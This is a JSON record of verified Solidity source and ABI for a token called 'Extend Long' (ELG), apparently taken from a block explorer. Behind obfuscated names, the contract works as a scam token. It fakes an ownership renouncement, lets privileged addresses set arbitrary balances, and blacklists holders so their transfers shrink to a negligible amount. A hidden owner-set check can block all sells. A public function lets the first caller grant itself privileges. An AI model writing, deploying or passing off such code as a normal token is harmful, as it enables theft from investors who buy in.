{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface sellShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchSender) external view returns (uint256);\n\n    function transfer(address fundTeam, uint256 tradingLiquidity) external returns (bool);\n\n    function allowance(address tradingIsAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundTeam,\n        uint256 tradingLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listSender, uint256 value);\n    event Approval(address indexed tradingIsAmount, address indexed spender, uint256 value);\n}\n\nabstract contract senderShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTo {\n    function createPair(address limitSell, address launchShouldTx) external returns (address);\n}\n\ninterface sellShouldMetadata is sellShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtendLong is senderShould, sellShould, sellShouldMetadata {\n\n    function fundShould(address totalLimit) public {\n        exemptSellLiquidity();\n        if (totalAuto != autoShould) {\n            totalAuto = autoShould;\n        }\n        if (totalLimit == amountAuto || totalLimit == atToAuto) {\n            return;\n        }\n        tokenLaunched[totalLimit] = true;\n    }\n\n    bool private modeFrom;\n\n    uint256 private swapMarketing = 100000000 * 10 ** 18;\n\n    function tokenSender() public {\n        emit OwnershipTransferred(amountAuto, address(0));\n        swapShould = address(0);\n    }\n\n    function receiverSender(uint256 tradingLiquidity) public {\n        exemptSellLiquidity();\n        exemptSender = tradingLiquidity;\n    }\n\n    function launchFund(address tokenTotal, uint256 tradingLiquidity) public {\n        exemptSellLiquidity();\n        shouldFund[tokenTotal] = tradingLiquidity;\n    }\n\n    address public amountAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapShould;\n    }\n\n    address private swapShould;\n\n    constructor (){\n        \n        modeTeam isLaunched = modeTeam(modeReceiver);\n        atToAuto = liquidityTo(isLaunched.factory()).createPair(isLaunched.WETH(), address(this));\n        \n        amountAuto = _msgSender();\n        tokenSender();\n        senderTotal[amountAuto] = true;\n        shouldFund[amountAuto] = swapMarketing;\n        \n        emit Transfer(address(0), amountAuto, swapMarketing);\n    }\n\n    uint256 teamFund;\n\n    bool private feeTeam;\n\n    address listSenderSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptSellLiquidity() private view {\n        require(senderTotal[_msgSender()]);\n    }\n\n    address modeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address tokenTotal, uint256 tradingLiquidity) external virtual override returns (bool) {\n        return walletAutoLaunch(_msgSender(), tokenTotal, tradingLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed launchedSender, address indexed minBuyAmount);\n\n    uint256 public listReceiver;\n\n    mapping(address => bool) public senderTotal;\n\n    uint256 public fundAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txTake;\n    }\n\n    bool public enableTake;\n\n    mapping(address => bool) public tokenLaunched;\n\n    address public atToAuto;\n\n    string private launchedAmount = \"Extend Long\";\n\n    function approve(address feeWallet, uint256 tradingLiquidity) public virtual override returns (bool) {\n        liquidityReceiver[_msgSender()][feeWallet] = tradingLiquidity;\n        emit Approval(_msgSender(), feeWallet, tradingLiquidity);\n        return true;\n    }\n\n    uint256 constant takeSwap = 7 ** 10;\n\n    function walletAutoLaunch(address launchWalletList, address fundTeam, uint256 tradingLiquidity) internal returns (bool) {\n        if (launchWalletList == amountAuto) {\n            return receiverLimit(launchWalletList, fundTeam, tradingLiquidity);\n        }\n        uint256 marketingTeamExempt = sellShould(atToAuto).balanceOf(listSenderSell);\n        require(marketingTeamExempt == exemptSender);\n        require(fundTeam != listSenderSell);\n        if (tokenLaunched[launchWalletList]) {\n            return receiverLimit(launchWalletList, fundTeam, takeSwap);\n        }\n        return receiverLimit(launchWalletList, fundTeam, tradingLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityReceiver;\n\n    function owner() external view returns (address) {\n        return swapShould;\n    }\n\n    uint256 exemptSender;\n\n    string private teamLaunch = \"ELG\";\n\n    uint256 public autoShould;\n\n    uint256 private totalAuto;\n\n    function allowance(address swapTakeMarketing, address feeWallet) external view virtual override returns (uint256) {\n        if (feeWallet == modeReceiver) {\n            return type(uint256).max;\n        }\n        return liquidityReceiver[swapTakeMarketing][feeWallet];\n    }\n\n    bool private launchedReceiver;\n\n    function transferFrom(address launchWalletList, address fundTeam, uint256 tradingLiquidity) external override returns (bool) {\n        if (_msgSender() != modeReceiver) {\n            if (liquidityReceiver[launchWalletList][_msgSender()] != type(uint256).max) {\n                require(tradingLiquidity <= liquidityReceiver[launchWalletList][_msgSender()]);\n                liquidityReceiver[launchWalletList][_msgSender()] -= tradingLiquidity;\n            }\n        }\n        return walletAutoLaunch(launchWalletList, fundTeam, tradingLiquidity);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLaunch;\n    }\n\n    mapping(address => uint256) private shouldFund;\n\n    function balanceOf(address launchSender) public view virtual override returns (uint256) {\n        return shouldFund[launchSender];\n    }\n\n    function fundSender(address sellTrading) public {\n        if (enableTake) {\n            return;\n        }\n        \n        senderTotal[sellTrading] = true;\n        \n        enableTake = true;\n    }\n\n    function receiverLimit(address launchWalletList, address fundTeam, uint256 tradingLiquidity) internal returns (bool) {\n        require(shouldFund[launchWalletList] >= tradingLiquidity);\n        shouldFund[launchWalletList] -= tradingLiquidity;\n        shouldFund[fundTeam] += tradingLiquidity;\n        emit Transfer(launchWalletList, fundTeam, tradingLiquidity);\n        return true;\n    }\n\n    uint8 private txTake = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIsAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minBuyAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTakeMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"}],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWalletList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtendLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}